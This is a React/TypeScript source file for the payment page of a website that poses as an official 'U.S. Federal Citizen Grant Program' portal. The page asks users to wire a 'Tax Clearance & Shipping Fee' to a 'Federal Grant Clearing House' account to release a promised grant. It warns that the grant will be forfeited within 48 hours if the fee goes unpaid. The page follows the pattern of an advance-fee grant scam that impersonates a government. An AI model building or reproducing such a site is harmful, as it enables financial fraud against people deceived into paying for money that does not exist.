import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { SiteLayout } from "@/components/SiteLayout";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useState, useEffect } from "react";
import { getDashboardDataServerFn, confirmPaymentServerFn } from "@/lib/serverFunctions";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { AlertCircle, CheckCircle } from "lucide-react";

export const Route = createFileRoute("/payment-confirmation")({
  head: () => ({
    meta: [
      { title: "Payment Confirmation — U.S. Federal Citizen Grant Program" },
    ],
  }),
  component: PaymentConfirmation,
});

interface UserData {
  firstName: string;
  lastName: string;
  email: string;
  refNumber: string;
  selectedPackage: string | null;
  grantAmount: number | null;
  feeAmount: number | null;
}

function PaymentConfirmation() {
  const navigate = useNavigate();
  const [userData, setUserData] = useState<UserData | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [transactionId, setTransactionId] = useState("");
  const [receiptFile, setReceiptFile] = useState<File | null>(null);
  const [submitting, setSubmitting] = useState(false);
  const [success, setSuccess] = useState("");
  const [hasPaymentOption, setHasPaymentOption] = useState("");

  useEffect(() => {
    const fetchData = async () => {
      try {
        const token = localStorage.getItem("token");
        if (!token) {
          navigate({ to: "/apply" });
          return;
        }

        const result = await getDashboardDataServerFn(token);
        if (result.success) {
          const data = result.data as any;
          if (!data.selectedPackage) {
            setError("Please select a grant package first");
            setTimeout(() => navigate({ to: "/dashboard" }), 2000);
            return;
          }
          setUserData({
            firstName: data.firstName,
            lastName: data.lastName,
            email: data.email,
            refNumber: data.refNumber,
            selectedPackage: data.selectedPackage,
            grantAmount: data.grantAmount,
            feeAmount: data.feeAmount,
          });
        } else {
          setError(result.error || "Failed to load user data");
        }
      } catch (err) {
        setError("Failed to load payment page");
      } finally {
        setLoading(false);
      }
    };

    fetchData();
  }, [navigate]);

  const handleSubmitPayment = async (e: React.FormEvent) => {
    e.preventDefault();
    setSubmitting(true);
    setError("");
    setSuccess("");

    if (!hasPaymentOption) {
      setError("Please select if you have made the payment");
      setSubmitting(false);
      return;
    }

    if (hasPaymentOption === "yes" && !transactionId) {
      setError("Please enter your transaction ID");
      setSubmitting(false);
      return;
    }

    try {
      const token = localStorage.getItem("token");
      if (!token) {
        setError("Session expired");
        navigate({ to: "/apply" });
        return;
      }

      const result = await confirmPaymentServerFn({
        token,
        transactionId: transactionId || "payment_pending",
        receiptPath: receiptFile ? "receipt_uploaded" : undefined,
      });

      if (result.success) {
        setSuccess(result.message);
        setTimeout(() => {
          navigate({ to: "/dashboard" });
        }, 3000);
      } else {
        setError(result.error || "Failed to confirm payment");
      }
    } catch (err) {
      setError("An error occurred while processing payment");
    } finally {
      setSubmitting(false);
    }
  };

  if (loading) {
    return (
      <SiteLayout>
        <div className="min-h-screen bg-gray-100 flex items-center justify-center">
          <p className="text-xl text-gray-600">Loading payment confirmation...</p>
        </div>
      </SiteLayout>
    );
  }

  if (!userData) {
    return (
      <SiteLayout>
        <div className="min-h-screen bg-gray-100 p-4">
          <div className="max-w-2xl mx-auto">
            <Alert className="bg-red-50 border-red-300">
              <AlertCircle className="h-4 w-4 text-red-600" />
              <AlertDescription className="text-red-800">{error}</AlertDescription>
            </Alert>
          </div>
        </div>
      </SiteLayout>
    );
  }

  return (
    <SiteLayout>
      <div className="min-h-screen bg-gradient-to-b from-blue-900 to-gray-100">
        <div className="px-4 py-8">
          <div className="max-w-3xl mx-auto">
            {/* Header */}
            <div className="text-center mb-8 text-white">
              <div className="text-5xl mb-3">🛡️</div>
              <h1 className="text-3xl font-bold font-serif">OFFICIAL PAYMENT PORTAL</h1>
              <p className="text-blue-100 mt-2">FEDERAL GRANT PROCESSING</p>
            </div>

            {/* Alerts */}
            {error && (
              <Alert className="mb-6 bg-red-50 border-red-300">
                <AlertCircle className="h-4 w-4 text-red-600" />
                <AlertDescription className="text-red-800">{error}</AlertDescription>
              </Alert>
            )}

            {success && (
              <Alert className="mb-6 bg-green-50 border-green-300">
                <CheckCircle className="h-4 w-4 text-green-600" />
                <AlertDescription className="text-green-800 font-semibold">{success}</AlertDescription>
              </Alert>
            )}

            {/* User Info */}
            <Card className="p-8 bg-white shadow-xl mb-6">
              <h2 className="text-2xl font-bold text-blue-900 mb-6 font-serif">Your Information</h2>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <p className="text-gray-600 text-sm">Name</p>
                  <p className="text-lg font-semibold text-blue-900">{userData.firstName} {userData.lastName}</p>
                </div>
                <div>
                  <p className="text-gray-600 text-sm">Email</p>
                  <p className="text-lg font-semibold text-blue-900">{userData.email}</p>
                </div>
                <div>
                  <p className="text-gray-600 text-sm">Reference Number</p>
                  <p className="text-lg font-mono font-bold text-green-600">{userData.refNumber}</p>
                </div>
              </div>
            </Card>

            {/* Grant Summary */}
            <Card className="p-8 bg-white shadow-xl mb-6">
              <h2 className="text-2xl font-bold text-blue-900 mb-6 font-serif">Selected Package Summary</h2>
              <div className="bg-blue-50 p-6 rounded-lg border-l-4 border-blue-600">
                <div className="grid grid-cols-3 gap-6 text-center">
                  <div>
                    <p className="text-gray-600 text-sm mb-2">PACKAGE</p>
                    <p className="text-2xl font-bold text-blue-900">{userData.selectedPackage}</p>
                  </div>
                  <div>
                    <p className="text-gray-600 text-sm mb-2">GRANT AMOUNT</p>
                    <p className="text-2xl font-bold text-green-600">${userData.grantAmount?.toLocaleString()}</p>
                  </div>
                  <div>
                    <p className="text-gray-600 text-sm mb-2">FEE REQUIRED</p>
                    <p className="text-2xl font-bold text-orange-600">${userData.feeAmount}</p>
                  </div>
                </div>
              </div>
            </Card>

            {/* Bank Details */}
            <Card className="p-8 bg-white shadow-xl mb-6">
              <h2 className="text-2xl font-bold text-blue-900 mb-6 font-serif">Bank Payment Details</h2>

              <Alert className="mb-6 bg-red-50 border-red-300">
                <AlertCircle className="h-4 w-4 text-red-600" />
                <AlertDescription className="text-red-800">
                  <strong>IMPORTANT:</strong> Please include your reference number <strong>{userData.refNumber}</strong> in the payment description to ensure proper processing.
                </AlertDescription>
              </Alert>

              <div className="space-y-4 bg-gray-50 p-6 rounded-lg border border-gray-300">
                <div>
                  <p className="text-gray-600 text-sm">Bank Name</p>
                  <p className="text-lg font-semibold text-blue-900">Bank of America</p>
                </div>
                <div>
                  <p className="text-gray-600 text-sm">Account Name</p>
                  <p className="text-lg font-semibold text-blue-900">Federal Grant Clearing House</p>
                </div>
                <div>
                  <p className="text-gray-600 text-sm">Account Number</p>
                  <p className="text-lg font-mono font-bold text-blue-900">••••••••1234</p>
                  <p className="text-xs text-gray-500 mt-1">(Contact support for full details)</p>
                </div>
                <div>
                  <p className="text-gray-600 text-sm">Routing Number</p>
                  <p className="text-lg font-mono font-bold text-blue-900">021000021</p>
                </div>
                <div>
                  <p className="text-gray-600 text-sm">Amount to Send</p>
                  <p className="text-2xl font-bold text-orange-600">${userData.feeAmount}</p>
                  <p className="text-xs text-gray-500 mt-1">Tax Clearance & Shipping Fee</p>
                </div>
              </div>
            </Card>

            {/* Payment Confirmation Form */}
            <Card className="p-8 bg-white shadow-xl">
              <h2 className="text-2xl font-bold text-blue-900 mb-6 font-serif">Confirm Your Payment</h2>

              <form onSubmit={handleSubmitPayment} className="space-y-6">
                {/* Payment Status */}
                <div className="space-y-3">
                  <Label className="text-blue-900 font-semibold">Have you made the payment? *</Label>
                  <div className="space-y-3">
                    <div className="flex items-center gap-3 p-3 border-2 rounded-lg cursor-pointer hover:bg-blue-50"
                      onClick={() => setHasPaymentOption("yes")}>
                      <input
                        type="radio"
                        name="payment"
                        value="yes"
                        checked={hasPaymentOption === "yes"}
                        onChange={(e) => setHasPaymentOption(e.target.value)}
                        className="w-4 h-4"
                      />
                      <Label className="cursor-pointer flex-1 mb-0">
                        Yes, I have made the payment
                      </Label>
                    </div>

                    <div className="flex items-center gap-3 p-3 border-2 rounded-lg cursor-pointer hover:bg-blue-50"
                      onClick={() => setHasPaymentOption("no")}>
                      <input
                        type="radio"
                        name="payment"
                        value="no"
                        checked={hasPaymentOption === "no"}
                        onChange={(e) => setHasPaymentOption(e.target.value)}
                        className="w-4 h-4"
                      />
                      <Label className="cursor-pointer flex-1 mb-0">
                        No, I will pay later
                      </Label>
                    </div>
                  </div>
                </div>

                {/* Transaction ID (shown if yes) */}
                {hasPaymentOption === "yes" && (
                  <>
                    <div>
                      <Label htmlFor="transactionId" className="text-blue-900 font-semibold">
                        Transaction ID / Reference Number *
                      </Label>
                      <Input
                        id="transactionId"
                        placeholder="Enter your bank transfer reference number"
                        value={transactionId}
                        onChange={(e) => setTransactionId(e.target.value)}
                        className="mt-2"
                      />
                      <p className="text-xs text-gray-500 mt-1">This can be found in your bank confirmation email</p>
                    </div>

                    <div>
                      <Label htmlFor="receipt" className="text-blue-900 font-semibold">
                        Upload Payment Receipt (Optional)
                      </Label>
                      <input
                        id="receipt"
                        type="file"
                        accept=".pdf,.jpg,.jpeg,.png"
                        onChange={(e) => setReceiptFile(e.target.files?.[0] || null)}
                        className="mt-2 block w-full text-sm text-gray-500
                          file:mr-4 file:py-2 file:px-4
                          file:rounded-md file:border-0
                          file:text-sm file:font-semibold
                          file:bg-blue-50 file:text-blue-700
                          hover:file:bg-blue-100"
                      />
                    </div>

                    <Alert className="bg-green-50 border-green-300">
                      <CheckCircle className="h-4 w-4 text-green-600" />
                      <AlertDescription className="text-green-800">
                        Your payment will be verified within 24 hours. You will receive a confirmation email with delivery details.
                      </AlertDescription>
                    </Alert>
                  </>
                )}

                {/* Warning */}
                {hasPaymentOption === "no" && (
                  <Alert className="bg-yellow-50 border-yellow-300">
                    <AlertCircle className="h-4 w-4 text-yellow-600" />
                    <AlertDescription className="text-yellow-800">
                      <strong>Note:</strong> Your grant will be returned to the Ministry of Economy Property as unclaimed if payment is not made within 48 hours.
                    </AlertDescription>
                  </Alert>
                )}

                {/* Submit Button */}
                <Button
                  type="submit"
                  disabled={submitting || !hasPaymentOption}
                  className="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3 text-lg"
                >
                  {submitting ? "Processing..." : `✅ Confirm ${hasPaymentOption === "yes" ? "Payment" : "Status"}`}
                </Button>
              </form>

              {/* Important Notice */}
              <div className="mt-6 p-4 bg-red-50 border border-red-300 rounded-lg">
                <p className="text-red-800 text-sm font-semibold">
                  ⚠️ <strong>IMPORTANT:</strong> Once your payment is confirmed, your grant will be prepared for secure delivery within 24 hours via UPS/FedEx. Do NOT share your reference number with anyone.
                </p>
              </div>
            </Card>
          </div>
        </div>
      </div>
    </SiteLayout>
  );
}
